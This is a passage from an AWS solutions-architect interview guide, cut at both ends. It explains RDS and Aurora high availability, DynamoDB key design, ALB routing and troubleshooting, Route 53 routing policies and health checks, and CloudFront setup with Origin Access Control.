3. **Multipart Upload:** Required for objects > 5 GiB, recommended for objects > 100 MiB. Splits the object into parts, uploads in parallel, then S3 assembles them. Improves throughput and enables retry of individual parts.

4. **S3 Byte-Range Fetches:** For large GETs, request specific byte ranges in parallel. Downloads parts concurrently, like a download manager.

5. **S3 Select / Glacier Select:** If you only need a subset of data from an object (e.g., specific columns from a CSV), S3 Select pushes the query to S3 — only matching data is returned. Reduces data transfer and latency.

**Multi-account/Multi-region:** Transfer Acceleration is bucket-specific. For cross-region transfers, it significantly improves upload speed by leveraging the AWS backbone instead of the public internet.

# 6. RDS & Aurora — Relational Databases

---

### Q6.1: Your production PostgreSQL database on RDS went down when an AZ had an outage. How do you prevent this from happening again?

**Answer:**

**Context:** A single-AZ RDS instance is a single point of failure. An AZ outage means complete database unavailability.

**Solution: RDS Multi-AZ Deployment**

Multi-AZ creates a synchronous standby replica in a different AZ. AWS manages the replication and automatic failover.

**How it works:**

```
                    ┌──────────────┐
                    │  RDS Endpoint │  (DNS CNAME)
                    └──────┬───────┘
                           │
                  (Resolves to primary)
                           │
              AZ-a                    AZ-b
        ┌─────────────┐        ┌─────────────┐
        │   Primary    │──sync──│   Standby    │
        │   (active)   │  repl  │   (passive)  │
        │              │        │ No read/write│
        └─────────────┘        └─────────────┘
              EBS                     EBS
```

**Failover process:**
1. AWS detects primary failure (AZ outage, instance failure, storage failure).
2. DNS record is updated — the RDS endpoint CNAME flips to the standby's IP.
3. Standby becomes the new primary.
4. Typical failover time: 60–120 seconds.
5. A new standby is provisioned in another AZ.

**Application impact:**
- Connections are dropped during failover. Applications must handle reconnection.
- Use connection pooling (e.g., PgBouncer, RDS Proxy) to abstract failover from the app.
- The DNS TTL for the RDS endpoint is 5 seconds — applications should not cache DNS lookups aggressively.

**What Multi-AZ is NOT:**
- It's NOT a read replica. The standby does NOT serve reads.
- It's NOT a scaling solution. It's purely for availability.
- It's NOT cross-region. Both primary and standby are in the same region.

**Multi-AZ DB Cluster (newer, for MySQL/PostgreSQL):**
- Two readable standbys instead of one passive standby.
- Standbys can serve read traffic.
- Faster failover (~35 seconds).
- Higher cost.

**Multi-account:** RDS instances are per-account. For shared database access across accounts, use VPC peering/TGW (Q1.4/Q1.5) for network connectivity and database-level authentication.

**Multi-region:** Multi-AZ is single-region. For cross-region HA, use RDS Cross-Region Read Replicas (Q6.2) or Aurora Global Database (Q6.4).

**Concepts introduced:**
- **RDS Multi-AZ:** Synchronous standby replica in a different AZ with automatic DNS failover. For HA, not scaling. Standby is passive (non-readable) in standard mode.
- **RDS Endpoint:** A DNS CNAME that resolves to the current primary. Automatically updates during failover.
- **RDS Proxy:** A managed database proxy that pools connections, handles failover reconnection, and supports IAM authentication. Reduces failover disruption and connection overhead.

---

### Q6.2: Your application has a read-heavy workload (80% reads, 20% writes). The primary RDS instance is at 90% CPU from read queries. How do you scale?

**Answer:**

**Context:** Vertical scaling (bigger instance) has limits and is expensive. Horizontal read scaling uses Read Replicas.

**RDS Read Replicas:**

```
Application
    │
    ├── Writes ──► Primary (us-east-1a)
    │                 │
    │        async replication
    │                 │
    └── Reads  ──► Read Replica 1 (us-east-1b)
                  Read Replica 2 (us-east-1c)
                  Read Replica 3 (eu-west-1)  ← Cross-region
```

**Key characteristics:**
- **Asynchronous replication:** Replicas may lag behind the primary (replica lag). For most workloads, lag is < 1 second, but it can grow under heavy write load.
- **Independent endpoints:** Each replica has its own DNS endpoint. The application must be aware of replicas and direct reads appropriately.
- **Up to 15 replicas** (5 for some engines without Aurora).
- **Can be in different AZs or regions.**
- **Promotable:** A read replica can be promoted to a standalone primary (breaks replication). Useful for DR or creating a production clone.

**Read routing strategies:**
1. **Application-level routing:** Code explicitly sends reads to replica endpoints and writes to the primary.
2. **RDS Proxy:** Can route read-only queries to replicas automatically based on the SQL operation (reader endpoint).
3. **DNS-based:** Create a Route 53 weighted record set across replica endpoints.

**Cross-Region Read Replica:**
- Serves reads in a different region for lower latency.
- Can be promoted for disaster recovery (but promotion breaks replication and is manual).
- Uses asynchronous replication over the internet (encrypted in transit).
- Incurs cross-region data transfer costs.

**Trade-offs:**
- Async replication means stale reads are possible. Don't use replicas for reads that must be immediately consistent (e.g., "read-after-write" scenarios).
- Cross-region replicas add latency to replication but reduce read latency for remote users.
- More replicas = more write amplification on the primary (each write must be sent to each replica).

**Multi-account:** Read replicas can be created in different accounts using snapshot sharing + promote, but live cross-account replicas are not natively supported. Aurora supports cross-account cloning.

**Multi-region:** Cross-region read replicas are the RDS approach for multi-region reads and DR. Aurora Global Database (Q6.4) is the superior solution for this.

**Concepts introduced:**
- **Read Replica:** An asynchronous copy of the primary database that serves read traffic. Independent endpoint. Promotable to standalone. Helps scale read-heavy workloads.
- **Replica Lag:** The time delay between a write on the primary and its availability on the replica. Inherent to async replication.

---

### Q6.3: You need to perform database maintenance (engine upgrade, parameter change that requires reboot) with zero or near-zero downtime on production RDS. How?

**Answer:**

**Context:** RDS maintenance operations like engine upgrades cause reboots. Even Multi-AZ failovers take 60–120 seconds.

**Strategy: Blue-Green Deployment (RDS Blue/Green Deployments)**

AWS RDS natively supports blue-green deployments for MySQL and PostgreSQL.

**How it works:**

```
       Blue (Production)              Green (Staging)
    ┌───────────────────┐         ┌───────────────────┐
    │ Primary (v15.4)    │──sync──►│ Primary (v15.7)    │
    │ + Read Replicas    │  repl   │ + Read Replicas    │
    └───────────────────┘         └───────────────────┘
                                          │
                                 Apply changes:
                                 - Engine upgrade
                                 - Parameter changes
                                 - Schema changes
                                          │
                                 Switchover (< 1 min)
                                          │
                                          ▼
                                 Green becomes Production
                                 Blue is retired
```

**Steps:**
1. Create a blue-green deployment from the existing (blue) instance.
2. AWS creates a green environment with logical replication from blue.
3. Apply changes on green (upgrade engine, modify parameters).
4. Test green thoroughly.
5. Switchover: AWS flips the DNS endpoint from blue to green. Downtime is typically < 1 minute.
6. Old blue environment can be deleted after validation.

**Key points:**
- Green uses logical replication to stay in sync with blue during the change window.
- Switchover blocks writes briefly to ensure consistency.
- Rollback: if issues are detected quickly, you can switch back to blue.

**Alternative for engines without native blue-green:** Use DMS (Database Migration Service) for live replication from old to new, then cut over.

**Multi-account/Multi-region:** Blue-green is single-region. For cross-region maintenance coordination, plan upgrades region by region with Route 53 failover directing traffic to the region not under maintenance.

### Q6.4: When would you choose Aurora over standard RDS, and how does Aurora's architecture differ?

**Answer:**

**Context:** Aurora is AWS's cloud-native relational database. Compatible with MySQL and PostgreSQL but redesigned for the cloud.

**Aurora Architecture:**

```
                  ┌───────────────┐
                  │  Writer        │
                  │  Instance      │
                  └───────┬───────┘
                          │
            ┌─────────────┼─────────────┐
            │             │             │
     ┌──────┴──────┐ ┌───┴────┐ ┌──────┴──────┐
     │ Reader 1    │ │ Reader 2│ │ Reader 3    │
     └─────────────┘ └────────┘ └─────────────┘
            │             │             │
     ═══════╪═════════════╪═════════════╪════════
     │         Shared Storage Layer (Aurora)      │
     │   6 copies across 3 AZs (quorum-based)    │
     │   Auto-grows up to 128 TiB                │
     ═════════════════════════════════════════════
```

**Key architectural differences from RDS:**

1. **Storage separated from compute:** Aurora uses a distributed, shared storage layer. Up to 15 read replicas share the SAME storage — no replication lag for storage (replica lag is only for in-memory cache refresh, typically < 10ms).

2. **6-way replication across 3 AZs:** Data is replicated to 6 copies across 3 AZs. Writes use a quorum (4/6), reads use a quorum (3/6). Tolerates loss of an entire AZ + one more storage node without data loss.

3. **Storage auto-scales:** Starts at 10 GiB, grows in 10 GiB increments up to 128 TiB. No pre-provisioning needed. You pay only for what you use.

4. **Faster failover:** Aurora replicas can be promoted to writer in ~30 seconds. Read replicas are "warm" because they share the storage layer.

5. **Cluster endpoints:**
   - **Writer endpoint:** Always points to the current writer instance.
   - **Reader endpoint:** Load-balances across all read replicas.
   - **Custom endpoints:** Group specific replicas (e.g., for analytics workloads).

**Aurora Serverless v2:**
- Scales compute up and down in fine-grained increments (0.5 ACU steps).
- Scales to zero (v2 scales to minimum ACU, not zero — v1 scales to zero but is deprecated).
- Good for variable/unpredictable workloads, dev environments.

**Aurora Global Database:**

```
Primary Region (us-east-1)          Secondary Region (eu-west-1)
┌──────────────────────────┐       ┌──────────────────────────┐
│ Writer + Readers          │       │ Reader Cluster (read-only)│
│ Shared Storage            │──────►│ Shared Storage (replica)  │
└──────────────────────────┘  <1s  └──────────────────────────┘
                             repl lag
```

- Cross-region replication with < 1 second lag (vs minutes for RDS cross-region replicas).
- Managed failover to secondary region (RPO: ~1 second, RTO: ~1 minute for planned, ~1-2 minutes for unplanned).
- Up to 5 secondary regions.

**When to choose Aurora over RDS:**
- Need > 5 read replicas (Aurora supports 15).
- Need faster failover (~30s vs 60-120s).
- Variable storage needs (auto-scaling vs pre-provisioned EBS).
- Cross-region HA (Aurora Global Database vs manual cross-region replicas).
- Need serverless scaling.

**When to stay with RDS:**
- Budget-constrained (Aurora is ~20% more expensive at baseline).
- Simple single-instance workloads that don't need Aurora's HA features.
- Need database engines Aurora doesn't support (SQL Server, Oracle, MariaDB).

**Multi-account:** Aurora clusters are per-account. Cross-account access via network connectivity (VPC peering/TGW) and database-level grants. Aurora supports cross-account cluster cloning via RAM sharing.

**Multi-region:** Aurora Global Database is the recommended multi-region solution for Aurora-compatible workloads. Sub-second replication lag and fast managed failover.

**Concepts introduced:**
- **Aurora:** Cloud-native relational database with separated storage and compute. 6-way replication, shared storage layer, up to 15 readers, cluster endpoints.
- **Aurora Global Database:** Cross-region Aurora deployment with < 1s replication lag and managed failover. Up to 5 secondary regions.
- **Aurora Serverless v2:** Automatically scales compute capacity in fine-grained increments based on load.
- **ACU (Aurora Capacity Unit):** Measurement unit for Aurora Serverless compute. 1 ACU ≈ 2 GiB RAM + proportional CPU/networking.

# 7. DynamoDB — NoSQL

---

### Q7.1: You're designing a DynamoDB table for an e-commerce order system. Each user can have thousands of orders. How do you design the key schema to support efficient queries for: (a) all orders for a user, (b) orders in a date range, (c) orders by status?

**Answer:**

**Context:** DynamoDB is a key-value + document database. Performance depends entirely on key design. Poor key design leads to hot partitions and throttling.

**Key Schema Design:**

**Primary Key: Composite (Partition Key + Sort Key)**

```
Table: Orders
  PK (Partition Key): UserID     → e.g., "user-123"
  SK (Sort Key):      OrderDate#OrderID  → e.g., "2025-03-15#order-456"
```

**Why this design:**
- **Query (a): All orders for a user:** `PK = "user-123"` → returns all items with this PK, sorted by SK.
- **Query (b): Orders in a date range:** `PK = "user-123" AND SK BETWEEN "2025-01-01" AND "2025-03-31"` → efficient range query on SK.
- **Query (c): Orders by status:** This requires a Global Secondary Index (GSI).

**GSI for status queries:**

```
GSI: StatusIndex
  PK: Status       → e.g., "SHIPPED"
  SK: OrderDate     → e.g., "2025-03-15"
```

Query: `Status = "SHIPPED" AND OrderDate > "2025-03-01"` on the GSI.

**GSI mechanics:**
- A GSI is a full copy of selected attributes with a different key schema.
- Has its own provisioned capacity (separate from the base table).
- Eventually consistent reads only (not strongly consistent).
- Up to 20 GSIs per table.
- Over-indexing = higher cost (storage + write capacity for each GSI).

**Hot partition problem:** If one PK value receives disproportionate traffic (a "celebrity user" with millions of orders), that partition becomes a bottleneck.

**Mitigation strategies:**
- Write sharding: Append a random suffix to PK (`user-123#shard-0`, `user-123#shard-1`) to distribute across partitions. Queries must scatter-gather across shards.
- Use DynamoDB Adaptive Capacity: Automatically redistributes throughput to hot partitions (enabled by default).

**Capacity modes:**
- **On-demand:** Pay per read/write request. No capacity planning. Best for unpredictable workloads or new tables.
- **Provisioned:** Set read/write capacity units (RCU/WCU). Cheaper for predictable workloads. Use Auto Scaling to adjust.

```
1 RCU = 1 strongly consistent read/sec for items up to 4 KB
        2 eventually consistent reads/sec for items up to 4 KB
1 WCU = 1 write/sec for items up to 1 KB
```

**Multi-account:** DynamoDB tables are per-account, per-region. Cross-account access via IAM roles (Q2.2) with DynamoDB resource policies.

**Multi-region:** Use DynamoDB Global Tables for multi-region, active-active replication. All replicas accept writes. Conflict resolution: last-writer-wins. Sub-second replication.

**Concepts introduced:**
- **DynamoDB Partition Key (PK):** Determines the partition where an item is stored. Must distribute evenly for good performance.
- **DynamoDB Sort Key (SK):** Optional. Combined with PK for composite primary key. Enables range queries within a partition.
- **Global Secondary Index (GSI):** An index with a different PK/SK than the base table. Enables queries on non-key attributes. Eventually consistent. Has its own throughput capacity.
- **DynamoDB Global Tables:** Multi-region, multi-active replication. All regions can read and write. Last-writer-wins conflict resolution.
- **RCU/WCU:** Read Capacity Units and Write Capacity Units. The unit of provisioned throughput for DynamoDB.

# 8. Elastic Load Balancing (ALB Focus)

---

### Q8.1: You're setting up an ALB for a microservices application with three services: user-service, order-service, and payment-service. Each service runs on different target groups. How do you configure the ALB?

**Answer:**

**Context:** ALB supports content-based routing — a single ALB can route to multiple backend services based on the request.

**ALB Components:**

```
Internet → Route 53 → ALB
                        │
                ┌───────┴────────┐
                │  Listener:443   │  (HTTPS)
                │                 │
                │  Rules:         │
                │  ┌────────────┐ │
                │  │Path: /users│─┼──► Target Group: user-service
                │  │Path: /orders│─┼──► Target Group: order-service
                │  │Path: /pay  │─┼──► Target Group: payment-service
                │  │Default     │─┼──► Target Group: default (404 page)
                │  └────────────┘ │
                └─────────────────┘
```

**Listener:** Listens on a port+protocol (e.g., HTTPS:443). An ALB can have multiple listeners (e.g., HTTP:80 redirecting to HTTPS:443).

**Listener Rules:** Evaluated in priority order (lowest number = highest priority). Each rule has:
- **Conditions:** Path pattern (`/users/*`), host header (`api.example.com`), HTTP headers, query strings, source IP.
- **Actions:** Forward to target group, redirect, return fixed response.

**Target Groups:** A logical grouping of targets (EC2 instances, IPs, Lambda functions, or other ALBs). Each has:
- Health check configuration (path, interval, thresholds).
- Deregistration delay (how long to wait before removing an unhealthy target — default 300s).
- Load balancing algorithm (round robin or least outstanding requests).

**Configuration example:**

```
Listener: HTTPS:443 (Certificate from ACM — Q23.1)

Rule 1 (Priority 10): IF path = /api/users/*  → Forward to TG-UserService
Rule 2 (Priority 20): IF path = /api/orders/* → Forward to TG-OrderService
Rule 3 (Priority 30): IF path = /api/pay/*    → Forward to TG-PaymentService
Rule 4 (Default):     Fixed Response: 404

TG-UserService:
  Type: Instance
  Targets: EC2-user-1, EC2-user-2
  Health Check: GET /api/users/health, interval 15s
  Healthy threshold: 2, Unhealthy threshold: 3

TG-OrderService:
  Type: IP (ECS Fargate tasks)
  Health Check: GET /api/orders/health, interval 10s
```

**Host-based routing (multi-tenant):**

```
Rule: IF host = tenant-a.example.com → TG-TenantA
Rule: IF host = tenant-b.example.com → TG-TenantB
```

**Multi-account:** ALBs are per-account, per-region. For cross-account targets, use IP-type target groups (register IPs from peered VPCs). AWS also supports cross-account target groups via VPC Lattice (newer service).

**Multi-region:** ALBs are regional. For global traffic distribution across regions, use Route 53 (Q9.1) or Global Accelerator (Q26.1) in front of regional ALBs.

**Concepts introduced:**
- **ALB (Application Load Balancer):** Layer 7 (HTTP/HTTPS) load balancer. Supports content-based routing (path, host, headers, query strings), WebSockets, HTTP/2, and gRPC.
- **Listener:** Checks for connection requests on a configured port/protocol.
- **Listener Rules:** Evaluate conditions and route traffic to target groups.
- **Target Group:** A set of registered targets (EC2, IPs, Lambda) with health check configuration and load balancing algorithm.

---

### Q8.2: Your ALB is returning 502 Bad Gateway errors intermittently. How do you troubleshoot?

**Answer:**

**Context:** ALB 502 means the ALB received an invalid response from the target, or the target closed the connection prematurely.

**Troubleshooting flow:**

```
ALB 502 Error
    │
    ├── Check ALB Access Logs (S3) (Should be Enabled) (AWS ELB service writes to S3: It is not your IAM role, It is an AWS-managed service principal: logdelivery.elasticloadbalancing.amazonaws.com)
    │   └── Look at: target:port, target_status_code, request_processing_time
    │
    ├── Check Target Group Health
    │   └── Are targets healthy? If not, check health check path/port
    │
    ├── Check Target Application Logs
    │   └── Is the app crashing? OOM? Timeout?
    │
    └── Check Connection/Timeout Settings
        └── ALB idle timeout vs app keep-alive timeout
```

**Common causes:**

1. **Target not responding in time:** ALB has an idle timeout (default 60s). If the backend takes longer, ALB closes the connection → 502.
   - Fix: Increase ALB idle timeout, or optimize the backend.

2. **Target keep-alive < ALB idle timeout:** If the target's HTTP keep-alive closes the connection before the ALB's idle timeout, the ALB may send a request on a closed connection.
   - Fix: Set target keep-alive timeout HIGHER than ALB idle timeout.
   - Example: ALB idle = 60s → set app keep-alive = 65s.

3. **Target returning malformed HTTP response:** If the backend returns non-HTTP content or closes the connection mid-response.
   - Fix: Check application error logs.

4. **All targets unhealthy:** ALB sends traffic to unhealthy targets (fail-open behavior) and gets bad responses.
   - Fix: Fix health check configuration. Ensure health check path returns 200.

5. **Target Security Group blocks ALB:** The target's SG doesn't allow traffic from the ALB's SG.
   - Fix: SG rule `Allow TCP <app-port> from SG-ALB`.

**HTTP keep-alive**

```
Normally (without keep-alive):
Request → Response → Connection CLOSED

With keep-alive:
Request → Response → Connection STAYS OPEN → Next request reuses same connection
```

**ALB Access Logs fields to analyze:**
- `elb_status_code`: The HTTP status code from the ALB (502).
- `target_status_code`: The status code from the target. If `-`, the target didn't respond at all.
- `request_processing_time`: Time from request receipt to target connection. If high, the target is slow or SG is blocking.
- `target_processing_time`: Time the target took to respond. If `-`, connection was refused/timed out.

**Multi-account/Multi-region:** ALB access logs can be written to S3 in a central logging account. Analysis patterns are the same regardless of account/region.

---

### Q8.3: Your application uses sessions and users are complaining that they're being logged out randomly. The app is behind an ALB with multiple instances. What's happening?

**Answer:**

**Context:** Stateful applications store session data in instance memory. When the ALB routes a user's next request to a different instance, their session is lost.

**Problem: No session affinity**

By default, ALB distributes requests round-robin across healthy targets. Each request may go to a different instance.

**Solution 1: ALB Sticky Sessions (Session Affinity)**

- ALB generates a cookie (`AWSALB`) that pins a user to a specific target for a configurable duration.
- Application-based stickiness: The ALB uses a cookie set by the application itself.

**Configuration:**
```
Target Group → Attributes → Stickiness:
  Type: Application-based cookie or Duration-based cookie
  Cookie name: AWSALB (duration-based) or custom (application-based)
  Duration: 1 hour (for duration-based)
```

**Problems with sticky sessions:**
- Uneven load distribution: A "heavy" user is always on one instance, potentially overloading it.
- Scaling issues: When a new instance joins, existing sticky sessions don't redistribute.
- Instance failure: All sticky sessions for that instance are lost.

**Solution 2: Externalize Session State (Recommended)**

Store sessions in a shared data store instead of instance memory:

```
ALB → Any Instance → Session Store (ElastiCache Redis / DynamoDB)
```

- **ElastiCache Redis (Q25.1):** Low latency, in-memory. Good for session data. Set TTL for auto-expiry.
- **DynamoDB (Q7.1):** Serverless, auto-scales. Higher latency than Redis but operationally simpler.

This allows truly stateless instances — any instance can serve any user. ALB distributes evenly. Auto Scaling works perfectly.

**Trade-offs:**
- Sticky sessions: Quick fix, no architecture change, but fragile and hurts scalability.
- External session store: Requires code change but is the production-grade approach. Adds a dependency (Redis/DynamoDB) but eliminates session-related issues.

**Multi-account/Multi-region:** External session stores are essential for multi-region architectures. Use DynamoDB Global Tables for cross-region session replication, or Redis with Global Datastore.

**Concepts introduced:**
- **Sticky Sessions (Session Affinity):** ALB feature that routes requests from the same client to the same target using cookies. Useful for stateful apps but creates load imbalance.
- **Stateless Architecture:** Application instances don't store local state. All state is externalized to shared stores (databases, caches). Enables horizontal scaling and fault tolerance.

### Q8.4: What's the difference between ALB, NLB, and Gateway LB? When do you use each?

**Answer:**

**Context:** AWS has three load balancer types, each designed for different use cases.

```
| Feature              | ALB (Application)      | NLB (Network)          | GWLB (Gateway)         |
|----------------------|-----------------------|-----------------------|-----------------------|
| OSI Layer            | Layer 7 (HTTP/HTTPS)  | Layer 4 (TCP/UDP/TLS) | Layer 3 (IP packets)  |
| Routing              | Path, host, headers   | Port-based             | All traffic inspection|
| Latency              | ~ms (higher)          | ~μs (ultra-low)       | Transparent           |
| Static IP            | No (use Global Accel) | Yes (Elastic IP/AZ)   | N/A                   |
| WebSocket            | Yes                    | Yes                    | N/A                   |
| TLS Termination      | Yes                    | Yes (TLS listener)    | No                    |
| Preserve Source IP   | Via X-Forwarded-For   | Yes (natively)        | Yes                   |
| PrivateLink Support  | No                     | Yes (endpoint service)| Yes                   |
| Use Case             | Web apps, APIs, μsvc  | Real-time, gaming,    | Security appliances,  |
|                      |                       | IoT, TCP services     | firewalls, IDS/IPS    |
```

**NLB key differences:**
- Handles millions of requests per second with ultra-low latency.
- Preserves the client's source IP address (ALB replaces it with the ALB's IP — use X-Forwarded-For header).
- Supports Elastic IPs — gives you static IP addresses for the load balancer (useful for firewall allowlisting).
- Required for PrivateLink endpoint services (Q12.2).

**Gateway LB:**
- Deploys third-party virtual appliances (firewalls, IDS/IPS) transparently in the traffic path.
- All traffic to/from your VPC routes through the GWLB → security appliance → back.
- Uses GENEVE encapsulation.

**Decision matrix:**
- HTTP/HTTPS traffic with content-based routing → ALB.
- TCP/UDP with ultra-low latency or static IPs → NLB.
- PrivateLink endpoint service → NLB.
- Inline security inspection → Gateway LB.

**Multi-account/Multi-region:** All LB types are regional and per-account. NLB is used as the PrivateLink provider for cross-account service consumption (Q12.2).

**Concepts introduced:**
- **NLB (Network Load Balancer):** Layer 4 load balancer for TCP/UDP. Ultra-low latency. Preserves source IP. Supports static IPs via EIP. Required for PrivateLink.
- **Gateway Load Balancer (GWLB):** Transparent inline traffic inspection using GENEVE tunneling. For deploying security appliances.

# 9. Route 53 — DNS & Traffic Management

---

### Q9.1: You have an application deployed in two regions (us-east-1 and eu-west-1) and want to route users to the closest healthy region. How do you set this up with Route 53?

**Answer:**

**Context:** Route 53 is AWS's managed DNS service that doubles as a global traffic manager through its routing policies.

**Route 53 Routing Policies:**

1. **Simple:** One record, one value (or multiple values returned in random order). No health checks evaluated for multi-value simple records.

2. **Weighted:** Distribute traffic by percentage. Records with weight 70 and 30 send ~70% and ~30% of traffic respectively. Good for canary deployments.

3. **Latency-based:** Routes to the region with the lowest latency from the user's location. AWS measures latency from Route 53 resolver to each region — not the actual user.

4. **Geolocation:** Routes based on the user's geographic location (continent, country, state). Requires a default record for non-matched locations.

5. **Geoproximity:** Routes based on geographic proximity, with a bias you can tune. Part of Route 53 Traffic Flow.

6. **Failover:** Active-passive. Primary record serves traffic. If the health check fails, Route 53 returns the secondary record.

7. **Multi-value Answer:** Returns up to 8 healthy records. Client picks one. NOT a replacement for a load balancer — it's DNS-level distribution.

**For this scenario: Latency-based routing with health checks**

```
                     Route 53
                   (Latency-based)
                    /          \
           US users             EU users
              │                    │
              ▼                    ▼
        us-east-1              eu-west-1
        ALB-US                 ALB-EU
        EC2 fleet              EC2 fleet
```

**Configuration:**

```
Record: app.example.com
  Type: A (Alias)
  Routing: Latency

  Region: us-east-1
    Alias Target: ALB-US (dualstack.alb-us-123.us-east-1.elb.amazonaws.com)
    Health Check: HC-US (HTTP check on ALB-US /health)

  Region: eu-west-1
    Alias Target: ALB-EU (dualstack.alb-eu-456.eu-west-1.elb.amazonaws.com)
    Health Check: HC-EU (HTTP check on ALB-EU /health)
```

**Alias Records:** Route 53-specific record type that maps to AWS resources (ALB, CloudFront, S3 website, etc.) without incurring additional DNS query charges. Alias records respond with the resource's IP directly — no CNAME chain.

**Failover behavior with health checks:**
- Route 53 checks health every 10s (standard) or 30s (basic).
- If HC-US fails, Route 53 stops returning the us-east-1 record. All traffic goes to eu-west-1.
- DNS TTL affects how quickly clients switch. Lower TTL = faster failover but more DNS queries.

**Multi-account:** Route 53 hosted zones can be in any account. Alias records can point to resources in different accounts (e.g., ALB in account A, Route 53 in account B) if properly configured.

**Multi-region:** This IS the multi-region pattern for DNS-based traffic management. Combine with CloudFront (Q10.1) for additional edge caching.

**Concepts introduced:**
- **Route 53 Routing Policies:** Traffic management strategies implemented at the DNS level — simple, weighted, latency, geolocation, geoproximity, failover, multi-value.
- **Alias Record:** Route 53-specific DNS record that maps to AWS resources natively. Free DNS queries. No TTL management issues. Supports zone apex (naked domain).
- **Zone Apex (Naked Domain):** The root of your domain (e.g., `example.com` without `www`). Standard DNS CNAMEs can't be used at zone apex. Alias records solve this.

---

### Q9.2: How do Route 53 health checks work, and how do you configure them for a multi-tier application?

**Answer:**

**Context:** Health checks are the backbone of Route 53's traffic management. Without them, Route 53 can't detect failures and failover.

**Health Check Types:**

1. **Endpoint health checks:** Route 53 sends requests to your endpoint (HTTP, HTTPS, or TCP) from multiple global locations. The endpoint is healthy if it responds with the expected status code.

2. **Calculated health checks:** Combines the results of multiple child health checks using AND, OR, or threshold logic (e.g., "healthy if at least 2 of 3 child checks are healthy").

3. **CloudWatch alarm health checks:** Health status is derived from a CloudWatch alarm state. Useful for internal resources that aren't reachable from the internet.

**For a multi-tier app:**

```
Route 53 Health Check (Calculated)
    │
    ├── Child HC 1: ALB endpoint (HTTP 200 on /health)
    ├── Child HC 2: CloudWatch alarm on RDS CPU < 90%
    └── Child HC 3: CloudWatch alarm on app error rate < 5%

Calculated: Healthy if ALL children are healthy
```

**Endpoint health check configuration:**
- **IP or domain name** of the endpoint.
- **Port and path** (e.g., port 443, path `/health`).
- **String matching:** Optionally check if the response body contains a specific string (e.g., "OK"). The response must be in the first 5,120 bytes.
- **Request interval:** 10 seconds (fast) or 30 seconds (standard). Fast costs more.
- **Failure threshold:** How many consecutive failures before marking unhealthy (default 3).

**Key point:** Route 53 health checks are sent from AWS's public health checkers. They cannot reach private resources (private IPs, resources in private subnets). For private resources, use CloudWatch alarm-based health checks.

**Multi-account:** Health checks are per-account but can monitor endpoints in any account (as long as they're publicly reachable or via CloudWatch alarm). Centralize health checks in the account owning the Route 53 hosted zone.

**Multi-region:** Health checks run from global locations automatically. They can monitor endpoints in any region.

**Concepts introduced:**
- **Route 53 Health Checks:** Automated health monitoring for DNS failover. Three types: endpoint (direct check), calculated (aggregate), and CloudWatch alarm-based (for private resources).

# 10. CloudFront — CDN

---

### Q10.1: You're serving a web application globally and users in Asia are experiencing 3+ second page loads. Your origin is in us-east-1. How do you solve this with CloudFront?

**Answer:**

**Context:** Latency from Asia to us-east-1 is 200-400ms per round trip. Multiple round trips for HTML, CSS, JS, images can exceed 3 seconds easily.

**Solution: CloudFront Distribution**

CloudFront is AWS's CDN with 400+ edge locations globally. It caches content at edge locations close to users, reducing latency dramatically.

```
Asia User → Edge Location (Tokyo) → [Cache Hit?]
                                        │
                          Yes: Return cached content (< 50ms)
                          No:  Fetch from Origin → Cache → Return
                                        │
                                        ▼
                              Origin (us-east-1)
                              ALB / S3 / Custom Origin
```

**CloudFront Components:**

1. **Distribution:** The CloudFront "instance." Has a domain name (`d123.cloudfront.net`) and configuration.

2. **Origins:** Where CloudFront fetches content when there's a cache miss.
   - S3 bucket
   - ALB / NLB
   - EC2 instance (public)
   - Custom origin (any HTTP server)
   - MediaStore, MediaPackage

3. **Behaviors:** Rules that determine HOW CloudFront handles requests for specific URL patterns.
   - Path pattern: `*.jpg` → behavior 1 (cache aggressively), `/api/*` → behavior 2 (no cache, forward all headers).
   - Cache policy: What to include in the cache key (query strings, headers, cookies).
   - Origin request policy: What to forward to the origin.
   - Viewer protocol policy: HTTP only, HTTPS only, or redirect HTTP to HTTPS.

**Configuration for web app:**

```
Distribution:
  Origin 1: ALB-US (for dynamic content)
  Origin 2: S3 Bucket (for static assets)

  Behavior 1 (Default: /api/*):
    Origin: ALB-US
    Cache Policy: No caching (CachingDisabled)
    Origin Request Policy: Forward all (headers, cookies, query strings)
    Viewer Protocol: HTTPS only

  Behavior 2 (/static/*):
    Origin: S3 Bucket
    Cache Policy: CachingOptimized (TTL: 86400s)
    Compress: Yes (gzip, Brotli)
    Viewer Protocol: HTTPS only
```

**Performance improvements:**
- Static content: Cached at edge. Users get < 50ms response time globally.
- Dynamic content: Not cached, but CloudFront still helps via:
  - **Persistent connections to origin:** CloudFront keeps warm connections to the origin, avoiding TCP handshake overhead.
  - **Route optimization:** CloudFront routes through the AWS backbone to the origin, which is faster than public internet.
  - **TLS session reuse:** Reduced TLS handshake overhead.

**Multi-account:** CloudFront distributions are per-account. The origin can be in any account (ALB, S3) as long as CloudFront can reach it.

**Multi-region:** CloudFront is global by nature. For multi-region origins, use CloudFront Origin Groups (failover between origins) or Route 53 latency-based routing as the origin domain.

**Concepts introduced:**
- **CloudFront:** AWS's global CDN. 400+ edge locations. Caches content at the edge for low-latency delivery.
- **CloudFront Distribution:** The top-level CloudFront resource. Defines origins, behaviors, and settings.
- **Behaviors:** URL pattern-based rules that control caching, forwarding, and protocol settings.
- **Cache Policy:** Defines what attributes (headers, query strings, cookies) are part of the cache key. Fewer attributes = higher cache hit rate.
- **Origin Request Policy:** Defines what CloudFront forwards to the origin (independent of cache key).

### Q10.2: You have an S3 bucket serving static assets. You want CloudFront to serve these assets, but the S3 bucket itself should NOT be directly accessible from the internet. How?

**Answer:**

**Context:** Exposing the S3 bucket publicly defeats the purpose of CloudFront (users could bypass the CDN, you lose caching, geo-restrictions, and WAF protection).

**Solution: Origin Access Control (OAC)**

OAC replaces the older Origin Access Identity (OAI). It ensures only CloudFront can access the S3 bucket.

**How it works:**

```
User → CloudFront → (SigV4 signed request) → S3 Bucket
                                                   │
                                         Bucket Policy:
                                         Allow only CloudFront
                                         distribution's OAC
```

**Setup:**

1. Create an OAC in CloudFront.
2. Assign it to the S3 origin in the distribution.
3. Update the S3 bucket policy to allow only the CloudFront distribution via the OAC.

**S3 Bucket Policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowCloudFrontOAC",
      "Effect": "Allow",
      "Principal": {
        "Service": "cloudfront.amazonaws.com"
      },
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-static-bucket/*",
      "Condition": {
        "StringEquals": {
          "AWS:SourceArn": "arn:aws:cloudfront::111111111111:distribution/E1234567890"
        }
      }
    }
  ]
}
```

**Why OAC over OAI:**
